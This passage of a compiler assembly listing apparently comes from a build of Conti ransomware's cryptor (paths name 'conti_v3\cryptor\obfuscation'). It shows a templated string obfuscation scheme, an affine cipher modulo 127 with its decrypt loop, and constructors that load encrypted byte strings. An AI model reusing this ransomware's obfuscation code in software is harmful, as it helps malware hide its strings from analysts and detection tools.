  0000b	c6 41 03 2e	 mov	 BYTE PTR [rcx+3], 46	; 0000002eH
  0000f	c6 41 04 64	 mov	 BYTE PTR [rcx+4], 100	; 00000064H
  00013	c6 41 05 64	 mov	 BYTE PTR [rcx+5], 100	; 00000064H
  00017	c6 41 06 64	 mov	 BYTE PTR [rcx+6], 100	; 00000064H
  0001b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0001f	48 8b c1	 mov	 rax, rcx
  00022	c3		 ret	 0
??0?$MetaBuffer@$0CL@$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<43,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::MetaBuffer<43,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BP@$0CD@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0BP@$0CD@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<31,35,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 04 00 00
	00		 mov	 r11d, 4
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 23	 sub	 ecx, 35			; 00000023H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 29	 imul	 r8d, ecx, 41		; 00000029H

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BP@$0CD@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<31,35,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BP@$0CD@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0BP@$0CD@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<31,35,std::integer_sequence<unsigned __int64,0,1,2,3> >::MetaBuffer<31,35,std::integer_sequence<unsigned __int64,0,1,2,3> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 40	 mov	 BYTE PTR [rcx+1], 64	; 00000040H
  00007	c6 41 02 23	 mov	 BYTE PTR [rcx+2], 35	; 00000023H
  0000b	c6 41 03 23	 mov	 BYTE PTR [rcx+3], 35	; 00000023H
  0000f	c6 41 04 23	 mov	 BYTE PTR [rcx+4], 35	; 00000023H
  00013	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00017	48 8b c1	 mov	 rax, rcx
  0001a	c3		 ret	 0
??0?$MetaBuffer@$0BP@$0CD@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<31,35,std::integer_sequence<unsigned __int64,0,1,2,3> >::MetaBuffer<31,35,std::integer_sequence<unsigned __int64,0,1,2,3> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DN@$0CI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0DN@$0CI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<61,40,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 72 00 00
	00		 mov	 r11d, 114		; 00000072H
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 28	 sub	 ecx, 40			; 00000028H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 19	 imul	 r8d, ecx, 25

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DN@$0CI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<61,40,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0DN@$0CI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0DN@$0CI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<61,40,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::MetaBuffer<61,40,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 77	 mov	 BYTE PTR [rcx+1], 119	; 00000077H
  00007	c6 41 02 28	 mov	 BYTE PTR [rcx+2], 40	; 00000028H
  0000b	c6 41 03 5f	 mov	 BYTE PTR [rcx+3], 95	; 0000005fH
  0000f	c6 41 04 28	 mov	 BYTE PTR [rcx+4], 40	; 00000028H
  00013	c6 41 05 13	 mov	 BYTE PTR [rcx+5], 19
  00017	c6 41 06 28	 mov	 BYTE PTR [rcx+6], 40	; 00000028H
  0001b	c6 41 07 2c	 mov	 BYTE PTR [rcx+7], 44	; 0000002cH
  0001f	c6 41 08 28	 mov	 BYTE PTR [rcx+8], 40	; 00000028H
  00023	c6 41 09 77	 mov	 BYTE PTR [rcx+9], 119	; 00000077H
  00027	c6 41 0a 28	 mov	 BYTE PTR [rcx+10], 40	; 00000028H
  0002b	c6 41 0b 5f	 mov	 BYTE PTR [rcx+11], 95	; 0000005fH
  0002f	c6 41 0c 28	 mov	 BYTE PTR [rcx+12], 40	; 00000028H
  00033	c6 41 0d 09	 mov	 BYTE PTR [rcx+13], 9
  00037	c6 41 0e 28	 mov	 BYTE PTR [rcx+14], 40	; 00000028H
  0003b	c6 41 0f 46	 mov	 BYTE PTR [rcx+15], 70	; 00000046H
  0003f	c6 41 10 28	 mov	 BYTE PTR [rcx+16], 40	; 00000028H
  00043	c6 41 11 04	 mov	 BYTE PTR [rcx+17], 4
  00047	c6 41 12 28	 mov	 BYTE PTR [rcx+18], 40	; 00000028H
  0004b	c6 41 13 77	 mov	 BYTE PTR [rcx+19], 119	; 00000077H
  0004f	c6 41 14 28	 mov	 BYTE PTR [rcx+20], 40	; 00000028H
  00053	c6 41 15 5f	 mov	 BYTE PTR [rcx+21], 95	; 0000005fH
  00057	c6 41 16 28	 mov	 BYTE PTR [rcx+22], 40	; 00000028H
  0005b	c6 41 17 18	 mov	 BYTE PTR [rcx+23], 24
  0005f	c6 41 18 28	 mov	 BYTE PTR [rcx+24], 40	; 00000028H
  00063	c6 41 19 69	 mov	 BYTE PTR [rcx+25], 105	; 00000069H
  00067	c6 41 1a 28	 mov	 BYTE PTR [rcx+26], 40	; 00000028H
  0006b	c6 41 1b 57	 mov	 BYTE PTR [rcx+27], 87	; 00000057H
  0006f	c6 41 1c 28	 mov	 BYTE PTR [rcx+28], 40	; 00000028H
  00073	c6 41 1d 27	 mov	 BYTE PTR [rcx+29], 39	; 00000027H
  00077	c6 41 1e 28	 mov	 BYTE PTR [rcx+30], 40	; 00000028H
  0007b	c6 41 1f 73	 mov	 BYTE PTR [rcx+31], 115	; 00000073H
  0007f	c6 41 20 28	 mov	 BYTE PTR [rcx+32], 40	; 00000028H
  00083	c6 41 21 5f	 mov	 BYTE PTR [rcx+33], 95	; 0000005fH
  00087	c6 41 22 28	 mov	 BYTE PTR [rcx+34], 40	; 00000028H
  0008b	c6 41 23 18	 mov	 BYTE PTR [rcx+35], 24
  0008f	c6 41 24 28	 mov	 BYTE PTR [rcx+36], 40	; 00000028H
  00093	c6 41 25 46	 mov	 BYTE PTR [rcx+37], 70	; 00000046H
  00097	c6 41 26 28	 mov	 BYTE PTR [rcx+38], 40	; 00000028H
  0009b	c6 41 27 57	 mov	 BYTE PTR [rcx+39], 87	; 00000057H
  0009f	c6 41 28 28	 mov	 BYTE PTR [rcx+40], 40	; 00000028H
  000a3	c6 41 29 5f	 mov	 BYTE PTR [rcx+41], 95	; 0000005fH
  000a7	c6 41 2a 28	 mov	 BYTE PTR [rcx+42], 40	; 00000028H
  000ab	c6 41 2b 13	 mov	 BYTE PTR [rcx+43], 19
  000af	c6 41 2c 28	 mov	 BYTE PTR [rcx+44], 40	; 00000028H
  000b3	c6 41 2d 57	 mov	 BYTE PTR [rcx+45], 87	; 00000057H
  000b7	c6 41 2e 28	 mov	 BYTE PTR [rcx+46], 40	; 00000028H
  000bb	c6 41 2f 2c	 mov	 BYTE PTR [rcx+47], 44	; 0000002cH
  000bf	c6 41 30 28	 mov	 BYTE PTR [rcx+48], 40	; 00000028H
  000c3	c6 41 31 5f	 mov	 BYTE PTR [rcx+49], 95	; 0000005fH
  000c7	c6 41 32 28	 mov	 BYTE PTR [rcx+50], 40	; 00000028H
  000cb	c6 41 33 09	 mov	 BYTE PTR [rcx+51], 9
  000cf	c6 41 34 28	 mov	 BYTE PTR [rcx+52], 40	; 00000028H
  000d3	c6 41 35 69	 mov	 BYTE PTR [rcx+53], 105	; 00000069H
  000d7	c6 41 36 28	 mov	 BYTE PTR [rcx+54], 40	; 00000028H
  000db	c6 41 37 6e	 mov	 BYTE PTR [rcx+55], 110	; 0000006eH
  000df	c6 41 38 28	 mov	 BYTE PTR [rcx+56], 40	; 00000028H
  000e3	c6 41 39 04	 mov	 BYTE PTR [rcx+57], 4
  000e7	c6 41 3a 28	 mov	 BYTE PTR [rcx+58], 40	; 00000028H
  000eb	c6 41 3b 50	 mov	 BYTE PTR [rcx+59], 80	; 00000050H
  000ef	c6 41 3c 28	 mov	 BYTE PTR [rcx+60], 40	; 00000028H
  000f3	c6 41 3d 09	 mov	 BYTE PTR [rcx+61], 9
  000f7	c6 41 3e 28	 mov	 BYTE PTR [rcx+62], 40	; 00000028H
  000fb	c6 41 3f 37	 mov	 BYTE PTR [rcx+63], 55	; 00000037H
  000ff	c6 41 40 28	 mov	 BYTE PTR [rcx+64], 40	; 00000028H
  00103	c6 41 41 57	 mov	 BYTE PTR [rcx+65], 87	; 00000057H
  00107	c6 41 42 28	 mov	 BYTE PTR [rcx+66], 40	; 00000028H
  0010b	c6 41 43 0b	 mov	 BYTE PTR [rcx+67], 11
  0010f	c6 41 44 28	 mov	 BYTE PTR [rcx+68], 40	; 00000028H
  00113	c6 41 45 46	 mov	 BYTE PTR [rcx+69], 70	; 00000046H
  00117	c6 41 46 28	 mov	 BYTE PTR [rcx+70], 40	; 00000028H
  0011b	c6 41 47 34	 mov	 BYTE PTR [rcx+71], 52	; 00000034H
  0011f	c6 41 48 28	 mov	 BYTE PTR [rcx+72], 40	; 00000028H
  00123	c6 41 49 57	 mov	 BYTE PTR [rcx+73], 87	; 00000057H
  00127	c6 41 4a 28	 mov	 BYTE PTR [rcx+74], 40	; 00000028H
  0012b	c6 41 4b 35	 mov	 BYTE PTR [rcx+75], 53	; 00000035H
  0012f	c6 41 4c 28	 mov	 BYTE PTR [rcx+76], 40	; 00000028H
  00133	c6 41 4d 69	 mov	 BYTE PTR [rcx+77], 105	; 00000069H
  00137	c6 41 4e 28	 mov	 BYTE PTR [rcx+78], 40	; 00000028H
  0013b	c6 41 4f 04	 mov	 BYTE PTR [rcx+79], 4
  0013f	c6 41 50 28	 mov	 BYTE PTR [rcx+80], 40	; 00000028H

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  00143	c6 41 51 68	 mov	 BYTE PTR [rcx+81], 104	; 00000068H
  00147	c6 41 52 28	 mov	 BYTE PTR [rcx+82], 40	; 00000028H
  0014b	c6 41 53 73	 mov	 BYTE PTR [rcx+83], 115	; 00000073H
  0014f	c6 41 54 28	 mov	 BYTE PTR [rcx+84], 40	; 00000028H
  00153	c6 41 55 46	 mov	 BYTE PTR [rcx+85], 70	; 00000046H
  00157	c6 41 56 28	 mov	 BYTE PTR [rcx+86], 40	; 00000028H
  0015b	c6 41 57 04	 mov	 BYTE PTR [rcx+87], 4
  0015f	c6 41 58 28	 mov	 BYTE PTR [rcx+88], 40	; 00000028H
  00163	c6 41 59 3a	 mov	 BYTE PTR [rcx+89], 58	; 0000003aH
  00167	c6 41 5a 28	 mov	 BYTE PTR [rcx+90], 40	; 00000028H
  0016b	c6 41 5b 09	 mov	 BYTE PTR [rcx+91], 9
  0016f	c6 41 5c 28	 mov	 BYTE PTR [rcx+92], 40	; 00000028H
  00173	c6 41 5d 09	 mov	 BYTE PTR [rcx+93], 9
  00177	c6 41 5e 28	 mov	 BYTE PTR [rcx+94], 40	; 00000028H
  0017b	c6 41 5f 50	 mov	 BYTE PTR [rcx+95], 80	; 00000050H
  0017f	c6 41 60 28	 mov	 BYTE PTR [rcx+96], 40	; 00000028H
  00183	c6 41 61 09	 mov	 BYTE PTR [rcx+97], 9
  00187	c6 41 62 28	 mov	 BYTE PTR [rcx+98], 40	; 00000028H
  0018b	c6 41 63 57	 mov	 BYTE PTR [rcx+99], 87	; 00000057H
  0018f	c6 41 64 28	 mov	 BYTE PTR [rcx+100], 40	; 00000028H
  00193	c6 41 65 4e	 mov	 BYTE PTR [rcx+101], 78	; 0000004eH
  00197	c6 41 66 28	 mov	 BYTE PTR [rcx+102], 40	; 00000028H
  0019b	c6 41 67 57	 mov	 BYTE PTR [rcx+103], 87	; 00000057H
  0019f	c6 41 68 28	 mov	 BYTE PTR [rcx+104], 40	; 00000028H
  001a3	c6 41 69 0b	 mov	 BYTE PTR [rcx+105], 11
  001a7	c6 41 6a 28	 mov	 BYTE PTR [rcx+106], 40	; 00000028H
  001ab	c6 41 6b 18	 mov	 BYTE PTR [rcx+107], 24
  001af	c6 41 6c 28	 mov	 BYTE PTR [rcx+108], 40	; 00000028H
  001b3	c6 41 6d 41	 mov	 BYTE PTR [rcx+109], 65	; 00000041H
  001b7	c6 41 6e 28	 mov	 BYTE PTR [rcx+110], 40	; 00000028H
  001bb	c6 41 6f 34	 mov	 BYTE PTR [rcx+111], 52	; 00000034H
  001bf	c6 41 70 28	 mov	 BYTE PTR [rcx+112], 40	; 00000028H
  001c3	c6 41 71 28	 mov	 BYTE PTR [rcx+113], 40	; 00000028H
  001c7	c6 41 72 28	 mov	 BYTE PTR [rcx+114], 40	; 00000028H
  001cb	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]

; 52   :     {
; 53   : 
; 54   :     }

  001cf	48 8b c1	 mov	 rax, rcx
  001d2	c3		 ret	 0
??0?$MetaBuffer@$0DN@$0CI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<61,40,std::integer_sequence<unsigned 